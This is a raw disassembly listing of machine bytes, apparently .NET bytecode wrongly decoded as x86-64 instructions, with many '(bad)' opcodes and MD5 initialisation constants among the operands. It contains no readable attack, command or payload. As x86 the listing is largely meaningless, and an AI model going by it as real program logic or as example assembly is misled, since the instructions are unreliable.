  4025a7:	16                   	(bad)
  4025a8:	73 1e                	jae    0x4025c8
  4025aa:	00 00                	add    %al,(%rax)
  4025ac:	0a 0a                	or     (%rdx),%cl
  4025ae:	06                   	(bad)
  4025af:	02 6f 1f             	add    0x1f(%rdi),%ch
  4025b2:	00 00                	add    %al,(%rax)
  4025b4:	0a 06                	or     (%rsi),%al
  4025b6:	03 6f 36             	add    0x36(%rdi),%ebp
  4025b9:	00 00                	add    %al,(%rax)
  4025bb:	0a 06                	or     (%rsi),%al
  4025bd:	28 37                	sub    %dh,(%rdi)
  4025bf:	00 00                	add    %al,(%rax)
  4025c1:	0a 6f 22             	or     0x22(%rdi),%ch
  4025c4:	00 00                	add    %al,(%rax)
  4025c6:	0a 06                	or     (%rsi),%al
  4025c8:	17                   	(bad)
  4025c9:	6f                   	outsl  (%rsi),(%dx)
  4025ca:	20 00                	and    %al,(%rax)
  4025cc:	00 0a                	add    %cl,(%rdx)
  4025ce:	06                   	(bad)
  4025cf:	17                   	(bad)
  4025d0:	6f                   	outsl  (%rsi),(%dx)
  4025d1:	23 00                	and    (%rax),%eax
  4025d3:	00 0a                	add    %cl,(%rdx)
  4025d5:	06                   	(bad)
  4025d6:	16                   	(bad)
  4025d7:	6f                   	outsl  (%rsi),(%dx)
  4025d8:	38 00                	cmp    %al,(%rax)
  4025da:	00 0a                	add    %cl,(%rdx)
  4025dc:	06                   	(bad)
  4025dd:	17                   	(bad)
  4025de:	6f                   	outsl  (%rsi),(%dx)
  4025df:	39 00                	cmp    %eax,(%rax)
  4025e1:	00 0a                	add    %cl,(%rdx)
  4025e3:	06                   	(bad)
  4025e4:	28 24 00             	sub    %ah,(%rax,%rax,1)
  4025e7:	00 0a                	add    %cl,(%rdx)
  4025e9:	6f                   	outsl  (%rsi),(%dx)
  4025ea:	3a 00                	cmp    (%rax),%al
  4025ec:	00 0a                	add    %cl,(%rdx)
  4025ee:	dd 06                	fldl   (%rsi)
  4025f0:	00 00                	add    %al,(%rax)
  4025f2:	00 26                	add    %ah,(%rsi)
  4025f4:	dd 00                	fldl   (%rax)
  4025f6:	00 00                	add    %al,(%rax)
  4025f8:	00 2a                	add    %ch,(%rdx)
  4025fa:	00 00                	add    %al,(%rax)
  4025fc:	01 10                	add    %edx,(%rax)
  4025fe:	00 00                	add    %al,(%rax)
  402600:	00 00                	add    %al,(%rax)
  402602:	04 00                	add    $0x0,%al
  402604:	4b                   	rex.WXB
  402605:	4f 00 06             	rex.WRXB add %r8b,(%r14)
  402608:	14 00                	adc    $0x0,%al
  40260a:	00 01                	add    %al,(%rcx)
  40260c:	52                   	push   %rdx
  40260d:	2b 02                	sub    (%rdx),%eax
  40260f:	26 16                	es (bad)
  402611:	2b 02                	sub    (%rdx),%eax
  402613:	26 16                	es (bad)
  402615:	28 50 00             	sub    %dl,0x0(%rax)
  402618:	00 06                	add    %al,(%rsi)
  40261a:	02 28                	add    (%rax),%ch
  40261c:	3b 00                	cmp    (%rax),%eax
  40261e:	00 0a                	add    %cl,(%rdx)
  402620:	2a 00                	sub    (%rax),%al
  402622:	00 00                	add    %al,(%rax)
  402624:	fe                   	(bad)
  402625:	2b 02                	sub    (%rdx),%eax
  402627:	26 16                	es (bad)
  402629:	2b 02                	sub    (%rdx),%eax
  40262b:	26 16                	es (bad)
  40262d:	28 50 00             	sub    %dl,0x0(%rax)
  402630:	00 06                	add    %al,(%rsi)
  402632:	16                   	(bad)
  402633:	8d 11                	lea    (%rcx),%edx
  402635:	00 00                	add    %al,(%rax)
  402637:	01 80 01 00 00 04    	add    %eax,0x4000001(%rax)
  40263d:	16                   	(bad)
  40263e:	80 02 00             	addb   $0x0,(%rdx)
  402641:	00 04 1f             	add    %al,(%rdi,%rbx,1)
  402644:	1a 28                	sbb    (%rax),%ch
  402646:	3c 00                	cmp    $0x0,%al
  402648:	00 0a                	add    %cl,(%rdx)
  40264a:	20 98 05 00 00 28    	and    %bl,0x28000005(%rax)
  402650:	1c 00                	sbb    $0x0,%al
  402652:	00 06                	add    %al,(%rsi)
  402654:	28 03                	sub    %al,(%rbx)
  402656:	00 00                	add    %al,(%rax)
  402658:	06                   	(bad)
  402659:	28 3d 00 00 0a 80    	sub    %bh,-0x7ff60000(%rip)        # 0xffffffff804a265f
  40265f:	03 00                	add    (%rax),%eax
  402661:	00 04 2a             	add    %al,(%rdx,%rbp,1)
  402664:	13 30                	adc    (%rax),%esi
  402666:	05 00 6a 00 00       	add    $0x6a00,%eax
  40266b:	00 04 00             	add    %al,(%rax,%rax,1)
  40266e:	00 11                	add    %dl,(%rcx)
  402670:	2b 02                	sub    (%rdx),%eax
  402672:	26 16                	es (bad)
  402674:	7e 04                	jle    0x40267a
  402676:	00 00                	add    %al,(%rax)
  402678:	04 20                	add    $0x20,%al
  40267a:	00 00                	add    %al,(%rax)
  40267c:	00 02                	add    %al,(%rdx)
  40267e:	02 58 6f             	add    0x6f(%rax),%bl
  402681:	3e 00 00             	ds add %al,(%rax)
  402684:	0a 0a                	or     (%rdx),%cl
  402686:	06                   	(bad)
  402687:	6f                   	outsl  (%rsi),(%dx)
  402688:	3f                   	(bad)
  402689:	00 00                	add    %al,(%rax)
  40268b:	0a 0d 16 13 04 38    	or     0x38041316(%rip),%cl        # 0x384439a7
  402691:	3a 00                	cmp    (%rax),%al
  402693:	00 00                	add    %al,(%rax)
  402695:	09 11                	or     %edx,(%rcx)
  402697:	04 9a                	add    $0x9a,%al
  402699:	0b 7e 04             	or     0x4(%rsi),%edi
  40269c:	00 00                	add    %al,(%rax)
  40269e:	04 07                	add    $0x7,%al
  4026a0:	6f                   	outsl  (%rsi),(%dx)
  4026a1:	40 00 00             	rex add %al,(%rax)
  4026a4:	0a 20                	or     (%rax),%ah
  4026a6:	00 00                	add    %al,(%rax)
  4026a8:	00 06                	add    %al,(%rsi)
  4026aa:	58                   	pop    %rax
  4026ab:	6f                   	outsl  (%rsi),(%dx)
  4026ac:	41 00 00             	add    %al,(%r8)
  4026af:	0a 74 35 00          	or     0x0(%rbp,%rsi,1),%dh
  4026b3:	00 01                	add    %al,(%rcx)
  4026b5:	0c 07                	or     $0x7,%al
  4026b7:	14 06                	adc    $0x6,%al
  4026b9:	08 28                	or     %ch,(%rax)
  4026bb:	42 00 00             	rex.X add %al,(%rax)
  4026be:	0a 74 0d 00          	or     0x0(%rbp,%rcx,1),%dh
  4026c2:	00 01                	add    %al,(%rcx)
  4026c4:	6f                   	outsl  (%rsi),(%dx)
  4026c5:	43 00 00             	rex.XB add %al,(%r8)
  4026c8:	0a 11                	or     (%rcx),%dl
  4026ca:	04 17                	add    $0x17,%al
  4026cc:	58                   	pop    %rax
  4026cd:	13 04 11             	adc    (%rcx,%rdx,1),%eax
  4026d0:	04 09                	add    $0x9,%al
  4026d2:	8e 69 3f             	mov    0x3f(%rcx),%gs
  4026d5:	bc ff ff ff 2a       	mov    $0x2affffff,%esp
  4026da:	00 00                	add    %al,(%rax)
  4026dc:	52                   	push   %rdx
  4026dd:	2b 02                	sub    (%rdx),%eax
  4026df:	26 16                	es (bad)
  4026e1:	2b 02                	sub    (%rdx),%eax
  4026e3:	26 16                	es (bad)
  4026e5:	28 50 00             	sub    %dl,0x0(%rax)
  4026e8:	00 06                	add    %al,(%rsi)
  4026ea:	02 28                	add    (%rax),%ch
  4026ec:	3b 00                	cmp    (%rax),%eax
  4026ee:	00 0a                	add    %cl,(%rdx)
  4026f0:	2a 00                	sub    (%rax),%al
  4026f2:	00 00                	add    %al,(%rax)
  4026f4:	9e                   	sahf
  4026f5:	2b 02                	sub    (%rdx),%eax
  4026f7:	26 16                	es (bad)
  4026f9:	2b 02                	sub    (%rdx),%eax
  4026fb:	26 16                	es (bad)
  4026fd:	28 50 00             	sub    %dl,0x0(%rax)
  402700:	00 06                	add    %al,(%rsi)
  402702:	d0 05 00 00 02 28    	rolb   $1,0x28020000(%rip)        # 0x28422708
  402708:	44 00 00             	add    %r8b,(%rax)
  40270b:	0a 6f 45             	or     0x45(%rdi),%ch
  40270e:	00 00                	add    %al,(%rax)
  402710:	0a 6f 46             	or     0x46(%rdi),%ch
  402713:	00 00                	add    %al,(%rax)
  402715:	0a 80 04 00 00 04    	or     0x4000004(%rax),%al
  40271b:	2a 0b                	sub    (%rbx),%cl
  40271d:	30 04 00             	xor    %al,(%rax,%rax,1)
  402720:	15 01 00 00 00       	adc    $0x1,%eax
  402725:	00 00                	add    %al,(%rax)
  402727:	00 2b                	add    %ch,(%rbx)
  402729:	02 26                	add    (%rsi),%ah
  40272b:	16                   	(bad)
  40272c:	2b 02                	sub    (%rdx),%eax
  40272e:	26 16                	es (bad)
  402730:	16                   	(bad)
  402731:	80 05 00 00 04 d0 07 	addb   $0x7,-0x2ffc0000(%rip)        # 0xffffffffd0442738
  402738:	00 00                	add    %al,(%rax)
  40273a:	02 28                	add    (%rax),%ch
  40273c:	44 00 00             	add    %r8b,(%rax)
  40273f:	0a 6f 45             	or     0x45(%rdi),%ch
  402742:	00 00                	add    %al,(%rax)
  402744:	0a 80 14 00 00 04    	or     0x4000014(%rax),%al
  40274a:	1f                   	(bad)
  40274b:	40 8d 41 00          	rex lea 0x0(%rcx),%eax
  40274f:	00 01                	add    %al,(%rcx)
  402751:	25 d0 25 00 00       	and    $0x25d0,%eax
  402756:	04 28                	add    $0x28,%al
  402758:	47 00 00             	rex.RXB add %r8b,(%r8)
  40275b:	0a 80 1c 00 00 04    	or     0x400001c(%rax),%al
  402761:	16                   	(bad)
  402762:	80 06 00             	addb   $0x0,(%rsi)
  402765:	00 04 16             	add    %al,(%rsi,%rdx,1)
  402768:	80 12 00             	adcb   $0x0,(%rdx)
  40276b:	00 04 16             	add    %al,(%rsi,%rdx,1)
  40276e:	8d 11                	lea    (%rcx),%edx
  402770:	00 00                	add    %al,(%rax)
  402772:	01 80 1b 00 00 04    	add    %eax,0x400001b(%rax)
  402778:	16                   	(bad)
  402779:	8d 11                	lea    (%rcx),%edx
  40277b:	00 00                	add    %al,(%rax)
  40277d:	01 80 07 00 00 04    	add    %eax,0x4000007(%rax)
  402783:	16                   	(bad)
  402784:	8d 11                	lea    (%rcx),%edx
  402786:	00 00                	add    %al,(%rax)
  402788:	01 80 08 00 00 04    	add    %eax,0x4000008(%rax)
  40278e:	16                   	(bad)
  40278f:	8d 11                	lea    (%rcx),%edx
  402791:	00 00                	add    %al,(%rax)
  402793:	01 80 18 00 00 04    	add    %eax,0x4000018(%rax)
  402799:	7e 48                	jle    0x4027e3
  40279b:	00 00                	add    %al,(%rax)
  40279d:	0a 80 09 00 00 04    	or     0x4000009(%rax),%al
  4027a3:	7e 48                	jle    0x4027ed
  4027a5:	00 00                	add    %al,(%rax)
  4027a7:	0a 80 0a 00 00 04    	or     0x400000a(%rax),%al
  4027ad:	16                   	(bad)
  4027ae:	8d 03                	lea    (%rbx),%eax
  4027b0:	00 00                	add    %al,(%rax)
  4027b2:	01 80 13 00 00 04    	add    %eax,0x4000013(%rax)
  4027b8:	16                   	(bad)
  4027b9:	8d 09                	lea    (%rcx),%ecx
  4027bb:	00 00                	add    %al,(%rax)
  4027bd:	01 80 0b 00 00 04    	add    %eax,0x400000b(%rax)
  4027c3:	17                   	(bad)
  4027c4:	80 15 00 00 04 16 80 	adcb   $0x80,0x16040000(%rip)        # 0x164427cb
  4027cb:	1d 00 00 04 73       	sbb    $0x73040000,%eax
  4027d0:	49 00 00             	rex.WB add %al,(%r8)
  4027d3:	0a 80 11 00 00 04    	or     0x4000011(%rax),%al
  4027d9:	16                   	(bad)
  4027da:	80 1f 00             	sbbb   $0x0,(%rdi)
  4027dd:	00 04 16             	add    %al,(%rsi,%rdx,1)
  4027e0:	6a 80                	push   $0xffffffffffffff80
  4027e2:	19 00                	sbb    %eax,(%rax)
  4027e4:	00 04 14             	add    %al,(%rsp,%rdx,1)
  4027e7:	80 0c 00 00          	orb    $0x0,(%rax,%rax,1)
  4027eb:	04 14                	add    $0x14,%al
  4027ed:	80 0d 00 00 04 16 6a 	orb    $0x6a,0x16040000(%rip)        # 0x164427f4
  4027f4:	80 1e 00             	sbbb   $0x0,(%rsi)
  4027f7:	00 04 16             	add    %al,(%rsi,%rdx,1)
  4027fa:	80 0e 00             	orb    $0x0,(%rsi)
  4027fd:	00 04 16             	add    %al,(%rsi,%rdx,1)
  402800:	80 0f 00             	orb    $0x0,(%rdi)
  402803:	00 04 16             	add    %al,(%rsi,%rdx,1)
  402806:	80 10 00             	adcb   $0x0,(%rax)
  402809:	00 04 16             	add    %al,(%rsi,%rdx,1)
  40280c:	80 1a 00             	sbbb   $0x0,(%rdx)
  40280f:	00 04 7e             	add    %al,(%rsi,%rdi,2)
  402812:	48 00 00             	rex.W add %al,(%rax)
  402815:	0a 80 17 00 00 04    	or     0x4000017(%rax),%al
  40281b:	16                   	(bad)
  40281c:	80 20 00             	andb   $0x0,(%rax)
  40281f:	00 04 73             	add    %al,(%rbx,%rsi,2)
  402822:	4a 00 00             	rex.WX add %al,(%rax)
  402825:	0a 80 16 00 00 04    	or     0x4000016(%rax),%al
  40282b:	17                   	(bad)
  40282c:	28 4b 00             	sub    %cl,0x0(%rbx)
  40282f:	00 0a                	add    %cl,(%rdx)
  402831:	dd 06                	fldl   (%rsi)
  402833:	00 00                	add    %al,(%rax)
  402835:	00 26                	add    %ah,(%rsi)
  402837:	dd 00                	fldl   (%rax)
  402839:	00 00                	add    %al,(%rax)
  40283b:	00 2a                	add    %ch,(%rdx)
  40283d:	00 00                	add    %al,(%rax)
  40283f:	00 01                	add    %al,(%rcx)
  402841:	10 00                	adc    %al,(%rax)
  402843:	00 00                	add    %al,(%rax)
  402845:	00 03                	add    %al,(%rbx)
  402847:	01 0b                	add    %ecx,(%rbx)
  402849:	0e                   	(bad)
  40284a:	01 06                	add    %eax,(%rsi)
  40284c:	0c 00                	or     $0x0,%al
  40284e:	00 01                	add    %al,(%rcx)
  402850:	16                   	(bad)
  402851:	2b 02                	sub    (%rdx),%eax
  402853:	26 16                	es (bad)
  402855:	2a 00                	sub    (%rax),%al
  402857:	00 13                	add    %dl,(%rbx)
  402859:	30 09                	xor    %cl,(%rcx)
  40285b:	00 9e 06 00 00 05    	add    %bl,0x5000006(%rsi)
  402861:	00 00                	add    %al,(%rax)
  402863:	11 2b                	adc    %ebp,(%rbx)
  402865:	02 26                	add    (%rsi),%ah
  402867:	16                   	(bad)
  402868:	1f                   	(bad)
  402869:	10 8d 41 00 00 01    	adc    %cl,0x1000041(%rbp)
  40286f:	0a 20                	or     (%rax),%ah
  402871:	c0 01 00             	rolb   $0x0,(%rcx)
  402874:	00 02                	add    %al,(%rdx)
  402876:	8e 69 1e             	mov    0x1e(%rcx),%gs
  402879:	5a                   	pop    %rdx
  40287a:	20 00                	and    %al,(%rax)
  40287c:	02 00                	add    (%rax),%al
  40287e:	00 5d 59             	add    %bl,0x59(%rbp)
  402881:	13 06                	adc    (%rsi),%eax
  402883:	11 06                	adc    %eax,(%rsi)
  402885:	20 00                	and    %al,(%rax)
  402887:	02 00                	add    (%rax),%al
  402889:	00 58 20             	add    %bl,0x20(%rax)
  40288c:	00 02                	add    %al,(%rdx)
  40288e:	00 00                	add    %al,(%rax)
  402890:	5d                   	pop    %rbp
  402891:	0d 09 3a 06 00       	or     $0x63a09,%eax
  402896:	00 00                	add    %al,(%rax)
  402898:	20 00                	and    %al,(%rax)
  40289a:	02 00                	add    (%rax),%al
  40289c:	00 0d 02 8e 69 6a    	add    %cl,0x6a698e02(%rip)        # 0x6aa9b6a4
  4028a2:	09 1e                	or     %ebx,(%rsi)
  4028a4:	5c                   	pop    %rsp
  4028a5:	6e                   	outsb  (%rsi),(%dx)
  4028a6:	58                   	pop    %rax
  4028a7:	1e                   	(bad)
  4028a8:	6a 58                	push   $0x58
  4028aa:	6d                   	insl   (%dx),(%rdi)
  4028ab:	13 05 02 8e 69 6a    	adc    0x6a698e02(%rip),%eax        # 0x6aa9b6b3
  4028b1:	1e                   	(bad)
  4028b2:	6a 5a                	push   $0x5a
  4028b4:	13 04 11             	adc    (%rcx,%rdx,1),%eax
  4028b7:	05 e0 8d 11 00       	add    $0x118de0,%eax
  4028bc:	00 01                	add    %al,(%rcx)
  4028be:	0b 16                	or     (%rsi),%edx
  4028c0:	13 07                	adc    (%rdi),%eax
  4028c2:	38 0e                	cmp    %cl,(%rsi)
  4028c4:	00 00                	add    %al,(%rax)
  4028c6:	00 07                	add    %al,(%rdi)
  4028c8:	11 07                	adc    %eax,(%rdi)
  4028ca:	02 11                	add    (%rcx),%dl
  4028cc:	07                   	(bad)
  4028cd:	91                   	xchg   %eax,%ecx
  4028ce:	9c                   	pushf
  4028cf:	11 07                	adc    %eax,(%rdi)
  4028d1:	17                   	(bad)
  4028d2:	58                   	pop    %rax
  4028d3:	13 07                	adc    (%rdi),%eax
  4028d5:	11 07                	adc    %eax,(%rdi)
  4028d7:	02 8e 69 3f e8 ff    	add    -0x17c097(%rsi),%cl
  4028dd:	ff                   	(bad)
  4028de:	ff 07                	incl   (%rdi)
  4028e0:	02 8e 69 8f 11 00    	add    0x118f69(%rsi),%cl
  4028e6:	00 01                	add    %al,(%rcx)
  4028e8:	25 71 11 00 00       	and    $0x1171,%eax
  4028ed:	01 20                	add    %esp,(%rax)
  4028ef:	80 00 00             	addb   $0x0,(%rax)
  4028f2:	00 60 d2             	add    %ah,-0x2e(%rax)
  4028f5:	81 11 00 00 01 1e    	adcl   $0x1e010000,(%rcx)
  4028fb:	13 08                	adc    (%rax),%ecx
  4028fd:	38 24 00             	cmp    %ah,(%rax,%rax,1)
  402900:	00 00                	add    %al,(%rax)
  402902:	07                   	(bad)
  402903:	11 05 6e 11 08 6a    	adc    %eax,0x6a08116e(%rip)        # 0x6a483a77
  402909:	59                   	pop    %rcx
  40290a:	d4                   	(bad)
  40290b:	11 04 1e             	adc    %eax,(%rsi,%rbx,1)
  40290e:	11 08                	adc    %ecx,(%rax)
  402910:	59                   	pop    %rcx
  402911:	1e                   	(bad)
  402912:	5a                   	pop    %rdx
  402913:	1f                   	(bad)
  402914:	3f                   	(bad)
  402915:	5f                   	pop    %rdi
  402916:	64 20 ff             	fs and %bh,%bh
  402919:	00 00                	add    %al,(%rax)
  40291b:	00 6a 5f             	add    %ch,0x5f(%rdx)
  40291e:	d2 9c 11 08 17 59 13 	rcrb   %cl,0x13591708(%rcx,%rdx,1)
  402925:	08 11                	or     %dl,(%rcx)
  402927:	08 16                	or     %dl,(%rsi)
  402929:	3d d4 ff ff ff       	cmp    $0xffffffd4,%eax
  40292e:	07                   	(bad)
  40292f:	8e 69 1e             	mov    0x1e(%rcx),%gs
  402932:	5a                   	pop    %rdx
  402933:	1f                   	(bad)
  402934:	20 5c 0c 20          	and    %bl,0x20(%rsp,%rcx,1)
  402938:	01 23                	add    %esp,(%rbx)
  40293a:	45                   	rex.RB
  40293b:	67 13 09             	adc    (%ecx),%ecx
  40293e:	20 89 ab cd ef 13    	and    %cl,0x13efcdab(%rcx)
  402944:	0a 20                	or     (%rax),%ah
  402946:	fe                   	(bad)
  402947:	dc ba 98 13 0b 20    	fdivrl 0x200b1398(%rdx)
  40294d:	76 54                	jbe    0x4029a3
  40294f:	32 10                	xor    (%rax),%dl
  402951:	13 0c 16             	adc    (%rsi,%rdx,1),%ecx
  402954:	13 0d 38 4b 05 00    	adc    0x54b38(%rip),%ecx        # 0x457492
  40295a:	00 11                	add    %dl,(%rcx)
  40295c:	0d 1c 62 13 0e       	or     $0xe13621c,%eax
  402961:	16                   	(bad)
  402962:	13 0f                	adc    (%rdi),%ecx
  402964:	38 3e                	cmp    %bh,(%rsi)
  402966:	00 00                	add    %al,(%rax)
  402968:	00 06                	add    %al,(%rsi)
  40296a:	11 0f                	adc    %ecx,(%rdi)
  40296c:	18 64 e0 07          	sbb    %ah,0x7(%rax,%riz,8)
  402970:	11 0e                	adc    %ecx,(%rsi)
  402972:	11 0f                	adc    %ecx,(%rdi)
  402974:	19 58 58             	sbb    %ebx,0x58(%rax)
  402977:	e0 91                	loopne 0x40290a
  402979:	1f                   	(bad)
  40297a:	18 62 07             	sbb    %ah,0x7(%rdx)
  40297d:	11 0e                	adc    %ecx,(%rsi)
  40297f:	11 0f                	adc    %ecx,(%rdi)
  402981:	18 58 58             	sbb    %bl,0x58(%rax)
  402984:	e0 91                	loopne 0x402917
  402986:	1f                   	(bad)
  402987:	10 62 60             	adc    %ah,0x60(%rdx)
  40298a:	07                   	(bad)
  40298b:	11 0e                	adc    %ecx,(%rsi)
  40298d:	11 0f                	adc    %ecx,(%rdi)
  40298f:	17                   	(bad)
  402990:	58                   	pop    %rax
  402991:	58                   	pop    %rax
  402992:	e0 91                	loopne 0x402925
  402994:	1e                   	(bad)
  402995:	62                   	(bad)
  402996:	60                   	(bad)
  402997:	07                   	(bad)
  402998:	11 0e                	adc    %ecx,(%rsi)
  40299a:	11 0f                	adc    %ecx,(%rdi)
  40299c:	58                   	pop    %rax
  40299d:	e0 91                	loopne 0x402930
  40299f:	60                   	(bad)
  4029a0:	9e                   	sahf
  4029a1:	11 0f                	adc    %ecx,(%rdi)
  4029a3:	1a 58 13             	sbb    0x13(%rax),%bl
  4029a6:	0f 11 0f             	movups %xmm1,(%rdi)
  4029a9:	1f                   	(bad)
  4029aa:	3d 44 b9 ff ff       	cmp    $0xffffb944,%eax
  4029af:	ff 11                	call   *(%rcx)
  4029b1:	09 13                	or     %edx,(%rbx)
  4029b3:	10 11                	adc    %dl,(%rcx)
  4029b5:	0a 13                	or     (%rbx),%dl
  4029b7:	11 11                	adc    %edx,(%rcx)
  4029b9:	0b 13                	or     (%rbx),%edx
  4029bb:	12 11                	adc    (%rcx),%dl
  4029bd:	0c 13                	or     $0x13,%al
  4029bf:	13 12                	adc    (%rdx),%edx
  4029c1:	09 11                	or     %edx,(%rcx)
  4029c3:	0a 11                	or     (%rcx),%dl
  4029c5:	0b 11                	or     (%rcx),%edx
  4029c7:	0c 16                	or     $0x16,%al
  4029c9:	1d 17 06 28 12       	sbb    $0x12280617,%eax
  4029ce:	00 00                	add    %al,(%rax)
  4029d0:	06                   	(bad)
  4029d1:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  4029d4:	09 11                	or     %edx,(%rcx)
  4029d6:	0a 11                	or     (%rcx),%dl
  4029d8:	0b 17                	or     (%rdi),%edx
  4029da:	1f                   	(bad)
  4029db:	0c 18                	or     $0x18,%al
  4029dd:	06                   	(bad)
  4029de:	28 12                	sub    %dl,(%rdx)
  4029e0:	00 00                	add    %al,(%rax)
  4029e2:	06                   	(bad)
  4029e3:	12 0b                	adc    (%rbx),%cl
  4029e5:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  4029e8:	09 11                	or     %edx,(%rcx)
  4029ea:	0a 18                	or     (%rax),%bl
  4029ec:	1f                   	(bad)
  4029ed:	11 19                	adc    %ebx,(%rcx)
  4029ef:	06                   	(bad)
  4029f0:	28 12                	sub    %dl,(%rdx)
  4029f2:	00 00                	add    %al,(%rax)
  4029f4:	06                   	(bad)
  4029f5:	12 0a                	adc    (%rdx),%cl
  4029f7:	11 0b                	adc    %ecx,(%rbx)
  4029f9:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  4029fc:	09 19                	or     %ebx,(%rcx)
  4029fe:	1f                   	(bad)
  4029ff:	16                   	(bad)
  402a00:	1a 06                	sbb    (%rsi),%al
  402a02:	28 12                	sub    %dl,(%rdx)
  402a04:	00 00                	add    %al,(%rax)
  402a06:	06                   	(bad)
  402a07:	12 09                	adc    (%rcx),%cl
  402a09:	11 0a                	adc    %ecx,(%rdx)
  402a0b:	11 0b                	adc    %ecx,(%rbx)
  402a0d:	11 0c 1a             	adc    %ecx,(%rdx,%rbx,1)
  402a10:	1d 1b 06 28 12       	sbb    $0x1228061b,%eax
  402a15:	00 00                	add    %al,(%rax)
  402a17:	06                   	(bad)
  402a18:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  402a1b:	09 11                	or     %edx,(%rcx)
  402a1d:	0a 11                	or     (%rcx),%dl
  402a1f:	0b 1b                	or     (%rbx),%ebx
  402a21:	1f                   	(bad)
  402a22:	0c 1c                	or     $0x1c,%al
  402a24:	06                   	(bad)
  402a25:	28 12                	sub    %dl,(%rdx)
  402a27:	00 00                	add    %al,(%rax)
  402a29:	06                   	(bad)
  402a2a:	12 0b                	adc    (%rbx),%cl
  402a2c:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402a2f:	09 11                	or     %edx,(%rcx)
  402a31:	0a 1c 1f             	or     (%rdi,%rbx,1),%bl
  402a34:	11 1d 06 28 12 00    	adc    %ebx,0x122806(%rip)        # 0x525240
  402a3a:	00 06                	add    %al,(%rsi)
  402a3c:	12 0a                	adc    (%rdx),%cl
  402a3e:	11 0b                	adc    %ecx,(%rbx)
  402a40:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402a43:	09 1d 1f 16 1e 06    	or     %ebx,0x61e161f(%rip)        # 0x65e4068
  402a49:	28 12                	sub    %dl,(%rdx)
  402a4b:	00 00                	add    %al,(%rax)
  402a4d:	06                   	(bad)
  402a4e:	12 09                	adc    (%rcx),%cl
  402a50:	11 0a                	adc    %ecx,(%rdx)
  402a52:	11 0b                	adc    %ecx,(%rbx)
  402a54:	11 0c 1e             	adc    %ecx,(%rsi,%rbx,1)
  402a57:	1d 1f 09 06 28       	sbb    $0x2806091f,%eax
  402a5c:	12 00                	adc    (%rax),%al
  402a5e:	00 06                	add    %al,(%rsi)
  402a60:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  402a63:	09 11                	or     %edx,(%rcx)
  402a65:	0a 11                	or     (%rcx),%dl
  402a67:	0b 1f                	or     (%rdi),%ebx
  402a69:	09 1f                	or     %ebx,(%rdi)
  402a6b:	0c 1f                	or     $0x1f,%al
  402a6d:	0a 06                	or     (%rsi),%al
  402a6f:	28 12                	sub    %dl,(%rdx)
  402a71:	00 00                	add    %al,(%rax)
  402a73:	06                   	(bad)
  402a74:	12 0b                	adc    (%rbx),%cl
  402a76:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402a79:	09 11                	or     %edx,(%rcx)
  402a7b:	0a 1f                	or     (%rdi),%bl
  402a7d:	0a 1f                	or     (%rdi),%bl
  402a7f:	11 1f                	adc    %ebx,(%rdi)
  402a81:	0b 06                	or     (%rsi),%eax
  402a83:	28 12                	sub    %dl,(%rdx)
  402a85:	00 00                	add    %al,(%rax)
  402a87:	06                   	(bad)
  402a88:	12 0a                	adc    (%rdx),%cl
  402a8a:	11 0b                	adc    %ecx,(%rbx)
  402a8c:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402a8f:	09 1f                	or     %ebx,(%rdi)
  402a91:	0b 1f                	or     (%rdi),%ebx
  402a93:	16                   	(bad)
  402a94:	1f                   	(bad)
  402a95:	0c 06                	or     $0x6,%al
  402a97:	28 12                	sub    %dl,(%rdx)
  402a99:	00 00                	add    %al,(%rax)
  402a9b:	06                   	(bad)
  402a9c:	12 09                	adc    (%rcx),%cl
  402a9e:	11 0a                	adc    %ecx,(%rdx)
  402aa0:	11 0b                	adc    %ecx,(%rbx)
  402aa2:	11 0c 1f             	adc    %ecx,(%rdi,%rbx,1)
  402aa5:	0c 1d                	or     $0x1d,%al
  402aa7:	1f                   	(bad)
  402aa8:	0d 06 28 12 00       	or     $0x122806,%eax
  402aad:	00 06                	add    %al,(%rsi)
  402aaf:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  402ab2:	09 11                	or     %edx,(%rcx)
  402ab4:	0a 11                	or     (%rcx),%dl
  402ab6:	0b 1f                	or     (%rdi),%ebx
  402ab8:	0d 1f 0c 1f 0e       	or     $0xe1f0c1f,%eax
  402abd:	06                   	(bad)
  402abe:	28 12                	sub    %dl,(%rdx)
  402ac0:	00 00                	add    %al,(%rax)
  402ac2:	06                   	(bad)
  402ac3:	12 0b                	adc    (%rbx),%cl
  402ac5:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402ac8:	09 11                	or     %edx,(%rcx)
  402aca:	0a 1f                	or     (%rdi),%bl
  402acc:	0e                   	(bad)
  402acd:	1f                   	(bad)
  402ace:	11 1f                	adc    %ebx,(%rdi)
  402ad0:	0f 06                	clts
  402ad2:	28 12                	sub    %dl,(%rdx)
  402ad4:	00 00                	add    %al,(%rax)
  402ad6:	06                   	(bad)
  402ad7:	12 0a                	adc    (%rdx),%cl
  402ad9:	11 0b                	adc    %ecx,(%rbx)
  402adb:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402ade:	09 1f                	or     %ebx,(%rdi)
  402ae0:	0f 1f 16             	nopl   (%rsi)
  402ae3:	1f                   	(bad)
  402ae4:	10 06                	adc    %al,(%rsi)
  402ae6:	28 12                	sub    %dl,(%rdx)
  402ae8:	00 00                	add    %al,(%rax)
  402aea:	06                   	(bad)
  402aeb:	12 09                	adc    (%rcx),%cl
  402aed:	11 0a                	adc    %ecx,(%rdx)
  402aef:	11 0b                	adc    %ecx,(%rbx)
  402af1:	11 0c 17             	adc    %ecx,(%rdi,%rdx,1)
  402af4:	1b 1f                	sbb    (%rdi),%ebx
  402af6:	11 06                	adc    %eax,(%rsi)
  402af8:	28 13                	sub    %dl,(%rbx)
  402afa:	00 00                	add    %al,(%rax)
  402afc:	06                   	(bad)
  402afd:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  402b00:	09 11                	or     %edx,(%rcx)
  402b02:	0a 11                	or     (%rcx),%dl
  402b04:	0b 1c 1f             	or     (%rdi,%rbx,1),%ebx
  402b07:	09 1f                	or     %ebx,(%rdi)
  402b09:	12 06                	adc    (%rsi),%al
